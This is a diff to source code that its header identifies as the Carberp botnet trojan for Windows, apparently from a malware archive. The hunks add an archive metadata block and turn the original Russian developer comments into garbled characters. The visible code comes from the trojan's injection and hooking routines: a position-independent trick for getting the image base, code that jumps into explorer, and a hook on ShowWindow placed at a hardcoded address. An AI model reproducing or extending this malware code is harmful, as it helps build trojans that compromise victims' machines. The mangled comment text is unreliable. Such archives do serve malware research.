@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 //Wdm.h (include Wdm.h, Ntddk.h, or Ntifs.h)
 
@@ -48,11 +59,11 @@ BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
 DWORD GetImageBase()
 {
 /*
-(28.12.2010 06:00:39) samuel_ro: Попробуй в асм блоке код: 
+(28.12.2010 06:00:39) samuel_ro: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ: 
 (28.12.2010 06:00:48) samuel_ro: db 0xe8
 (28.12.2010 06:00:56) samuel_ro: dd 0x00000000
 (28.12.2010 06:01:12) samuel_ro: pop eax //eax <- eip
-(28.12.2010 06:02:57) samuel_ro: код 0xe800000000 эквивалентен call +0, т.е. вызов команды следующей за call
+(28.12.2010 06:02:57) samuel_ro: пїЅпїЅпїЅ 0xe800000000 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ call +0, пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ call
 */
 	
 	DWORD dwRet = 0;
@@ -231,7 +242,7 @@ bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) )
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 
-//OutputDebugStringA("начинаем подмену адреса Hook_ShowWindow");
+//OutputDebugStringA("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Hook_ShowWindow");
 		if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
 		{  
 			__asm mov [Real_ShowWindow], eax			
